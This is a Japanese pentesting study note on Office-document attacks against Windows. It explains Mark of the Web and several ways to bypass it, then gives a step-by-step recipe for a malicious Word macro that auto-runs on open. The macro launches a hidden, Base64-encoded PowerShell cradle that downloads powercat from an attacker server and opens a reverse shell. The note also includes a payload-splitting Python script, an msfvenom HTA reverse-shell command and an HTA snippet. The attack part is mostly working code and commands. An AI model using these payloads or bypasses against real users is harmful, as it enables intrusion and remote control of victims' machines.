> [!NOTE]
この攻撃はWindowsが対象。
Unixシステムの場合は偽サイトをホストして認証情報を入力させる手法が現実的。

# Officeを使用したエクスプロイトの前提知識

- 直接メールに悪意のあるファイルを添付することは、昨今のセキュリティ製品によるフィルタやセキュリティ教育によって、成功確率の低い攻撃となっている
- 代わりに、Pretextを用意し、ダウンロードリンクなどの方法で悪意ある文書を提供する方法が使われる
- ただし、外部からダウンロードされたOfficeファイルには、MotWが付与される

---

# MotW（Mark of the Web）

## MotWとは

外部の信頼されていない場所からダウンロードされたファイルに自動的に付与されるプロパティ。Zone.Identifier ADS（代替データストリーム）によって付加される。
	ADS（Alternate Data Stream）：NTFSの機能で、1つのファイルに複数のデータストリーム（見えない"裏ファイル"）を持たせることができる仕組み。

## MotWが付与されたファイルに起きること

- 保護ビュー（Protected View）で開かれ、すべての編集・変更設定が無効になる
- マクロ・埋め込みオブジェクトの実行がブロックされる

![](../../Images/Pasted%20image%2020250514070955.png)

## Microsoftの方針変更（2022年7月）

**かつての攻撃手法**： ドキュメントの一部をぼかし「すべて閲覧するためには編集を有効にする必要があります」と依頼して、ターゲットに「Enable Editing（編集を有効にする）」や「Enable Content（コンテンツを有効にする）」を押させていた。

![](../../Images/Pasted%20image%2020250514071005.png)

**2022年7月のポリシー変更**（🔗[Microsoft announce 2022/07/20](https://techcommunity.microsoft.com/blog/microsoft_365blog/helping-users-stay-safe-blocking-internet-macros-by-default-in-office/3071805)）： インターネットからダウンロードされたファイルのマクロをデフォルトで全面ブロック。Enable Contentのボタンがなくなり、代わりにLearn Moreが表示されるようになった。

![](../../Images/Pasted%20image%2020250514071024.png)

## MotWありのファイルでマクロを実行させる手順（煩雑）

ターゲットがMotWを解除してマクロを実行するには、以下の煩雑な手順が必要となった。

| ステップ              | 説明                                                                                                                                             |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| ① プロパティ → ブロックの解除 | ファイルを右クリック → プロパティ → セキュリティ：「このファイルは他のコンピュータから取得したものです…」横の許可するにチェックしてOK（→ MotW削除）<br>![ 300](../../Images/Pasted%20image%2020250514071133.png) |
| ② ファイルを開く         | WordやExcelなどでファイルを開くと「保護されたビュー」で開かれる                                                                                                           |
| ③ 保護されたビューの解除     | 上部バーにある「編集を有効にする」をクリック                                                                                                                         |
| ④ マクロの有効化         | さらに「マクロの有効化」をクリック（マクロ付きファイルのみ表示）  <br>※MotWが残っているとこのステップが出てこない or 永続的にブロックされる                                                                  |

## MotWのバイパス

ファイルにMotWのプロパティを付与させない方法として以下の手法がある。

| 手法                  | 概要                                      | ポイント・備考                            |
| ------------------- | --------------------------------------- | ---------------------------------- |
| ISOファイル化            | ISOにファイルを格納し、ユーザーにマウントさせる。              | ISO内のファイルはNTFSストリームが無いためMotWが付かない。 |
| ZIP圧縮 + 解凍ツール依存     | ZIP圧縮し、7-Zipや古い解凍ツールで展開させる。             | 7-Zipなど一部ツールはMotWを伝播しない。           |
| FAT32/NFSファイルシステム利用 | MotWはNTFSのADSに依存するため、FAT32やNFSでは保存されない。 | USBに保存してから実行させるように誘導。              |
| IMG/VHD             | 仮想ディスク形式も、マウント後にMotWが除外されるケースがあり、悪用される。 |                                    |

- 参考記事：🔗[Mark-of-the-Web Bypass - Red canary](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/)

---

# Microsoft WordマクロによるReverse shell獲得

- LibreOfficeの場合のマクロ設定方法：🔗[Proving Grounds Practice write-up - Craft](https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc)
- マクロはClient-Side Attackのアタックベクターとして2026年現在も有効
- 関連用語
	- [マクロ・VBA・VBScript・WSH](../用語.md#マクロ・VBA・VBScript・WSH)
	- [ActiveX](../用語.md#ActiveX)

## Reverse Shell獲得マクロ作成
 
### ステップ1：Wordファイルの作成とマクロ編集画面の起動

1. 空白のWord文書を開き、`.doc`形式でファイルを保存する
	- Word Document：`.docx`
	- Word Macro-Enabled Document：`.docm` → マクロの警告あり
	- ✅Word 97 - 2003 Document：`.doc` → マクロの警告が出ないこともある

![](../../Images/Pasted%20image%2020250515074938.png)

2. マクロ作成ポップアップを開く

![](../../Images/Pasted%20image%2020250515075253.png)

3. Macro name（マクロ名）を入力し、Macros in（マクロの保存先）をステップ１で作成したWordファイル（mymacro.doc）を選択し、Create
	⚠️：保存先を選択しないと、グローバルなテンプレートとして保存されてしまう

![](../../Images/Pasted%20image%2020250515075507.png)

### ステップ2：マクロの基本構造（PowerShellを自動起動する）

> [!TIP]
> 以降は🔗[macro-generator - GitHub](https://github.com/jotyGill/macro-generator)で自動化できる。

マクロ編集画面を開くと以下の初期コードが表示される。Sub〜End Sub で囲まれた部分がsubプロシージャ（関数と異なり返り値がない）。
```vb
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

Shellオブジェクトを作成し、PowerShellを実行するマクロ
```vb
Sub MyMacro()

	CreateObject("WScript.Shell").Run "powershell"

End Sub
```

ファイルが開かれたタイミングでマクロが自動的に実行されるようにするマクロ
```vb
Sub AutoOpen()

	MyMacro

End Sub

Sub Document_Open()

	MyMacro

End Sub

Sub MyMacro()

	CreateObject("WScript.Shell").Run "powershell"

End Sub
```

> [!NOTE]
> AutoOpen() はFileメニューからファイルを開いた場合に、Document_Open() はVBA/マクロ経由で開かれた場合などにトリガーされる。
> Word文書の開かれ方によってどちらかが動作しないケースがあるため、両方記述してカバーする。

![](../../Images/Pasted%20image%2020250516080832.png)

$$編集後のマクロ$$

保存後にファイルを再度開くと以下の警告とEnable Contentボタンが表示され、押下するとPowerShellが起動する。

![](../../Images/Pasted%20image%2020250516081730.png)

![](../../Images/Pasted%20image%2020250516081833.png)

$$PowerShell起動$$

### ステップ3：Reverse Shell獲得マクロの作成

🔗[PowerCat](https://github.com/besimorhino/powercat)実行コマンドをbase64でエンコードし、リテラル文字列として使う。

> [!Warning]
> VBAではリテラル文字列に**255**文字の制限がある。PowerShellコマンドはこれを超えるため、変数に分割して連結する。

1. 攻撃者のマシンでPowerCatファイルをコピーし、コピー先のディレクトリ上でPython webサーバーを用意しておく
```zsh
locate powercat.ps1
cp <path_to_powercat.ps1> .
sudo python -m http.server 80
```

2. リバースシェルリスナーを用意しておく
```zsh
sudo rlwrap nc -lvnp 4444
```

3. 🔗[PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意（🔗[DownloadCradles.ps1 - Github](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)）
```powershell
IEX (New-Object Net.Webclient).downloadstring('http://<attacker_IP>/powercat.ps1');powercat -c <attacker_IP> -p <port> -e powershell
```

3. 特殊文字による実行失敗を防ぐため、Base64エンコードする：[Base64化したPowerShellリバースシェルワンライナー](../../Cheatsheet/Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)

4. Base64エンコードした文字列を50文字ずつに分割し、`Str = Str + "[分割後のbase64文字列]"`の形式で出力するPythonスクリプトを実行
```python
str = "powershell.exe -nop -w hidden -enc <Base64エンコード後文字列>"

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```
- `n = 50`：VBAの255文字制限に余裕を持たせた値（100でも動く可能性はある）
- `range(0, len(str), n)`：0から str の長さまで、n文字単位で繰り返す
- `str[i:i+n]`：文字列 str の i から i+n の範囲を切り出す（部分文字列）

![](../../Images/Pasted%20image%2020250517181019.png)

$$Pythonスクリプト実行結果$$

5. マクロ編集画面で文字列型の変数を宣言し、Base64エンコードして分割した文字列を変数で連結していく
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()

    Dim Str As String

	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
	Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
    
End Sub
```
- `Dim`：Dimention＝変数の宣言（英語の意味は”範囲”）

6. マクロを保存してファイルを閉じ、ターゲットに開かせるとリバースシェル獲得

---

# 補足

## HTAペイロード

- マクロの代わりに使えるペイロード

msfvenom
```zsh
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o shell.hta LPORT=443 LHOST=<attacker_IP>
```

コードスニペット
```html
<html>
<head>
<script language="VBScript">

  <!-- just opens cmd terminal -->
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);

</script>
</head>
<body>
<script language="VBScript">
<!-- close this HTA window now that script running -->
self.close();
</script>
</body>
</html>
```
